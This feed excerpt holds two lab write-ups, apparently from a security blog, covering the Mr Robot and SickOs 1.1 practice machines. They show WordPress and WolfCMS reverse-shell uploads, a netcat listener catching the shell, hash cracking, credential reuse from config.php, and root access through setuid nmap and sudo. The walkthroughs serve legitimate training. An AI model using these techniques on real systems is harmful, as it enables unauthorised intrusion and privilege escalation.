  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | Id | Login  | Name | Password  |
  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |    | elliot |      | ER28-0652 |
  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>Excellent, wpscan found the password is <em>ER28-0652</em>! I logged in and noticed that all the plugins are outdated:</p>

<p><img class="center" src="/images/pentest/mr-robot/plugins.png" title="&lsquo;wp plugins&rsquo; &lsquo;wp plugins&rsquo;" ></p>

<p>I tried uploading a PHP reverse shell as plugin, but got an error that it couldn&rsquo;t install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O</p>

<p><img class="center" src="/images/pentest/mr-robot/media.png" title="&lsquo;media library&rsquo; &lsquo;media library&rsquo;" ></p>

<p>Wasn&rsquo;t sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was <a href="http://192.168.217.145/wp-content/uploads/2017/07/shell.php">http://192.168.217.145/wp-content/uploads/2017/07/shell.php</a></p>

<h2>Flag #2</h2>

<p>Finally achieved presence on the machine:</p>

<p><code>
$ whoami
daemon
$ ls /home
robot
$ ls -la /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
</code></p>

<p>Found the second flag, but couldn&rsquo;t read it. However, that md5 file was readable:</p>

<p><code>
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
</code></p>

<p>I cracked the MD5 hash to reveal the password <em>abcdefghijklmnopqrstuvwxyz</em> for the user robot. I tried switching to that user, but I got the following error:</p>

<p><code>
$ su robot
su: must be run from a terminal
</code></p>

<p>The error appears because the shell isn&rsquo;t interactive. But I ran into this before, and again <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentestmonkey&rsquo;s oneliners</a> came to the rescue:</p>

<p>```
$ python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz</p>

<p>robot@linux:/$
```</p>

<p>I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it&rsquo;s annoying:</p>

<p><code>
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
</code></p>

<h2>Flag #3</h2>

<p>I couldn&rsquo;t find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:</p>

<p><code>
robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2&gt; /dev/null
[...]
/usr/local/bin/nmap
</code></p>

<p>After Googling, there even seems to be a <a href="https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap">setuid Nmap exploit</a> in Metasploit! I read more about this problem, and found an interesting <a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">SANS paper</a> (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):</p>

<p>```
robot@linux:/$ nmap &mdash;interactive
nmap &mdash;interactive</p>

<p>Starting nmap V. 3.81 ( <a href="http://www.insecure.org/nmap/">http://www.insecure.org/nmap/</a> )
Welcome to Interactive Mode &mdash; press h <enter> for help
nmap>
```</p>

<p>The Nmap version is 3.81, so I tried it out:</p>

<p><code>
nmap&gt; !whoami
!whoami
root
waiting to reap child : No child processes
</code></p>

<p>It did work! Game over, Mr Robot!</p>

<p>```
nmap> !sh
!sh</p>

<h1>ls /root</h1>

<p>ls /root
firstboot_done  key-3-of-3.txt</p>

<h1>cat /root/key-3-of-3.txt</h1>

<p>cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```</p>

<p>Another interesting challenge, more story driven. It reminded me of <a href="https://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/">Primer</a>.</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html">Using wpscan to find Wordpress vulnerabilities</a></p></li>
<li><p><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">Attack and Defend: Linux Privilege Escalation Techniques of 2016</a></p></li>
</ul>


<p>```</p>

<hr />

<p>/ You have literary talent that you \
\ should take pains to develop.     /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.1 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/"/>
    <updated>2017-06-28T08:09:14-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is similar to what can be found in OSCP labs. The goal is to obtain root privileges and get the flag. Let&rsquo;s dive right in!</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results are:</p>

<p>```
nmap -T4 -p- -A 192.168.217.143</p>

<p>PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|<em>  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
| http-open-proxy: Potentially OPEN proxy.
|</em>Methods supported: GET HEAD
|<em>http-server-header: squid/3.1.19
|</em>http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```</p>

<p>This is an interesting one, there are no obvious points of entry, but there is a Squid proxy in place. Navigating directly to port 3128 didn&rsquo;t yield anything besides an error of an invalid URL request. I googled the Squid version and found a potentially useful <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning">Metasploit module</a>:</p>

<blockquote><p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker
information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests
for internal IP addresses against a misconfigurated open Squid proxy exposed to the Internet, therefore performing an
internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many
Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open
proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy
which allows the attack to pivot to another part of the network).</p></blockquote>

<p>Here are the options I&rsquo;ve used for the scanner:</p>

<p>```
msf auxiliary(squid_pivot_scanning) > options</p>

<p>Module options (auxiliary/scanner/http/squid_pivot_scanning):</p>

<p>   Name          Current Setting                                  Required  Description</p>

<hr />

<p>   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RANGE         192.168.217.143                                  yes       IPs to scan through Squid proxy
   RHOSTS        192.168.217.143                                  yes       The target address range or CIDR identifier
   RPORT         3128                                             yes       The target port (TCP)
   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
   THREADS       1                                                yes       The number of concurrent threads
   VHOST                                                          no        HTTP server virtual host
```</p>

<p>And the output:</p>

<p>```
msf auxiliary(squid_pivot_scanning) > run</p>

<p>[+] [192.168.217.143] 192.168.217.143 is alive but 21 is CLOSED
[+] [192.168.217.143] 192.168.217.143:80 seems OPEN
[+] [192.168.217.143] 192.168.217.143 is alive but 139 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 445 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1433 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1521 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1723 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 3389 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 8080 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 9100 is CLOSED
[<em>] Scanned 1 of 1 hosts (100% complete)
[</em>] Auxiliary module execution completed
```</p>

<p>It appears port 80 is open on the target. I configured my browser to use the Squid proxy and went to the web server:</p>

<p><img class="center" src="/images/pentest/sickos/1-web.png" title="&lsquo;web server&rsquo; &lsquo;webpage&rsquo;" ></p>

<p>If it doesn&rsquo;t appear there is much content on the web server, we have to get more information by force _;) Since I had to take the proxy into consideration, I preferred a CLI tool rather than a GUI like Dirbuster. How fortunate that there is a CLI companion to Dirbuster, called <em>sound of drums</em>: <strong>dirb</strong>!</p>

<h3>dirb description</h3>

<p>Homepage: <a href="http://dirb.sourceforge.net/">http://dirb.sourceforge.net/</a></p>

<blockquote><p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web
Objects. It basically works by launching a dictionary based attack against
a web server and analizing the response.</p>

<p>DIRB comes with a set of preconfigured attack wordlists for easy usage but
you can use your custom wordlists. Also DIRB sometimes can be used as a
classic CGI scanner, but remember is a content scanner not a vulnerability scanner.</p>

<p>DIRB main purpose is to help in professional web application auditing.
Specially in security related testing. It covers some holes not covered by
classic web vulnerability scanners. DIRB looks for specific web objects that
other generic CGI scanners can&rsquo;t look for. It doesn&rsquo;t search vulnerabilities
nor does it look for web contents that can be vulnerables.</p></blockquote>

<h3>dirb options</h3>

<h2>``` </h2>

<p>DIRB v2.22</p>

<h2>By The Dark Raver</h2>

<p>./dirb &lt;url_base> [&lt;wordlist_file(s)>] [options]</p>

<p>========================= NOTES =========================
 &lt;url_base> : Base URL to scan. (Use -resume for session resuming)
 &lt;wordlist_file(s)> : List of wordfiles. (wordfile1,wordfile2,wordfile3&hellip;)</p>

<p>======================== HOTKEYS ========================
 &lsquo;n&rsquo; &ndash;> Go to next directory.
 &lsquo;q&rsquo; &ndash;> Stop scan. (Saving state for resume)
 &lsquo;r&rsquo; &ndash;> Remaining scan stats.</p>

<p>======================== OPTIONS ========================
 -a &lt;agent_string> : Specify your custom USER_AGENT.
 -c &lt;cookie_string> : Set a cookie for the HTTP request.
 -f : Fine tunning of NOT_FOUND (404) detection.
 -H &lt;header_string> : Add a custom header to the HTTP request.
 -i : Use case-insensitive search.
 -l : Print &ldquo;Location&rdquo; header when found.
 -N &lt;nf_code>: Ignore responses with this HTTP code.
 -o &lt;output_file> : Save output to disk.
 -p &lt;proxy[:port]> : Use this proxy. (Default port is 1080)
 -P &lt;proxy_username:proxy_password> : Proxy Authentication.
 -r : Don&rsquo;t search recursively.
 -R : Interactive recursion. (Asks for each directory)
 -S : Silent Mode. Don&rsquo;t show tested words. (For dumb terminals)
 -t : Don&rsquo;t force an ending &lsquo;/&rsquo; on URLs.
 -u &lt;username:password> : HTTP Authentication.
 -v : Show also NOT_FOUND pages.
 -w : Don&rsquo;t stop on WARNING messages.
 -X <extensions> / -x &lt;exts_file> : Append each word with this extensions.
 -z <milisecs> : Add a miliseconds delay to not cause excessive Flood.</p>

<p>======================== EXAMPLES =======================
 ./dirb <a href="http://url/directory/">http://url/directory/</a> (Simple Test)
 ./dirb <a href="http://url/">http://url/</a> -X .html (Test files with &lsquo;.html&rsquo; extension)
 ./dirb <a href="http://url/">http://url/</a> /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
 ./dirb <a href="https://secure_url/">https://secure_url/</a> (Simple Test with SSL)
```</p>

<p>This tool is exactly what I needed! And it finished really fast! Here are its discoveries:</p>

<p>```
dirb <a href="http://192.168.217.143">http://192.168.217.143</a> /usr/share/wordlists/dirb/common.txt -p 192.168.217.143:3128</p>

<hr />

<p>DIRB v2.22</p>

<h2>By The Dark Raver</h2>

<p>START_TIME: Thu Jun 29 06:45:12 2017
URL_BASE: <a href="http://192.168.217.143/">http://192.168.217.143/</a>
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
PROXY: 192.168.217.143:3128</p>

<hr />

<p>GENERATED WORDS: 4612</p>

<p>&mdash;&mdash; Scanning URL: <a href="http://192.168.217.143/">http://192.168.217.143/</a> &mdash;&mdash;
+ <a href="http://192.168.217.143/cgi-bin/">http://192.168.217.143/cgi-bin/</a> (CODE:403|SIZE:291)                                                                                             <br/>
+ <a href="http://192.168.217.143/connect">http://192.168.217.143/connect</a> (CODE:200|SIZE:109)                                                                                              <br/>
+ <a href="http://192.168.217.143/index">http://192.168.217.143/index</a> (CODE:200|SIZE:21)                                                                                                 <br/>
+ <a href="http://192.168.217.143/index.php">http://192.168.217.143/index.php</a> (CODE:200|SIZE:21)                                                                                             <br/>
+ <a href="http://192.168.217.143/robots">http://192.168.217.143/robots</a> (CODE:200|SIZE:45)                                                                                                <br/>
+ <a href="http://192.168.217.143/robots.txt">http://192.168.217.143/robots.txt</a> (CODE:200|SIZE:45)                                                                                            <br/>
+ <a href="http://192.168.217.143/server-status">http://192.168.217.143/server-status</a> (CODE:403|SIZE:296)</p>

<hr />

<p>END_TIME: Thu Jun 29 06:45:16 2017
DOWNLOADED: 4612 &ndash; FOUND: 7
```</p>

<p>Quite interesting. Some resources are forbidden, connect is a Python script with the following content:</p>

<p>```</p>

<h1>!/usr/bin/python</h1>

<p>print &ldquo;I Try to connect things very frequently\n&rdquo;
print &ldquo;You may want to try my services&rdquo;
```</p>

<p>The robots.txt file seems the most useful:</p>

<p><code>
User-agent: *
Disallow: /
Dissalow: /wolfcms
</code></p>

<p>A hidden CMS, eh? I went there to find this:</p>

<p><img class="center" src="/images/pentest/sickos/1-wolfcms.png" title="&lsquo;wolfcms&rsquo; &lsquo;wolfcms&rsquo;" ></p>

<p>I ran Nikto on it, didn&rsquo;t find anything interesting besides an outdated Apache version. Same with other scanners and another round of directory bruteforcing, nothing useful. I googled for WolfCMS, and found an arbitrary file upload exploit, but it required an authenticated user. So next I searched for the admin interface, and found an answer on <a href="https://www.wolfcms.org/forum/topic2034.html">their forums</a>. So I appended <em>?admin</em> to the path and got redirected to <a href="http://192.168.217.143/wolfcms/?/admin/login">http://192.168.217.143/wolfcms/?/admin/login</a></p>

<p><img class="center" src="/images/pentest/sickos/1-login.png" title="&lsquo;wolfcms admin&rsquo; &lsquo;wolfcms admin login&rsquo;" ></p>

<p>I couldn&rsquo;t find default credentials, no obvious SQL errors, so I tried a few common combinations, and imagine the surprise when <em>admin:admin</em> worked!</p>

<p><img class="center" src="/images/pentest/sickos/1-admin.png" title="&lsquo;admin&rsquo; &lsquo;wolfcms admin panel&rsquo;" ></p>

<h2>Exploitation</h2>

<p>Now I can use the <a href="https://www.exploit-db.com/exploits/36818/">exploit</a>. The vulnerability exists in the CMS' File Manager, which doesn&rsquo;t restrict the types of files that can be uploaded. But I forgot that I had to access the CMS through a proxy, and didn&rsquo;t want to modify the code, so instead I manually uploaded Pentestmonkey&rsquo;s reverse shell through the interface:</p>

<p><img class="center" src="/images/pentest/sickos/1-file.png" title="&lsquo;file manager&rsquo; &lsquo;wolfcms file upload&rsquo;" ></p>

<p>I set up a Netcat listener and navigated to the shell:</p>

<p><code>
root@kali:~# nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 33709
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 18:12:38 up  3:14,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
</code></p>

<p>I looked inside the web directory and found a <strong>config.php</strong> file in <code>/var/www/wolfcms</code> that contained a set of credentials:</p>

<p><code>
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
</code></p>

<p>I also noted the existence of a sickos user, based on the home directories. Tried SSH'ing as root, no joy. But trying as sickos with the above password worked! Inside sickos' home, I noticed a bash_history file:</p>

<p><code>
sickos@SickOs:~$ cat .bash_history
sudo su
exit
</code></p>

<p>Woot, could it be that easy? I did a <code>sudo -l</code>:</p>

<p>```
User sickos may run the following commands on this host:</p>

<pre><code>(ALL : ALL) ALL
</code></pre>

<p>```</p>

<p>Root was only a <em>sudo su</em> away!</p>

<p><code>
root@SickOs:~# whoami
root
</code></p>

<p>And the flag:</p>

<p>```
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!</p>

<p>ROOT!</p>

<p>You have Succesfully completed SickOS1.1.
Thanks for Trying
```</p>

<p>Thanks D4rk for an interesting machine, with a nice twist of Squid!</p>

<p>```</p>

<hr />

<p>&lt; You will outgrow your usefulness. ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
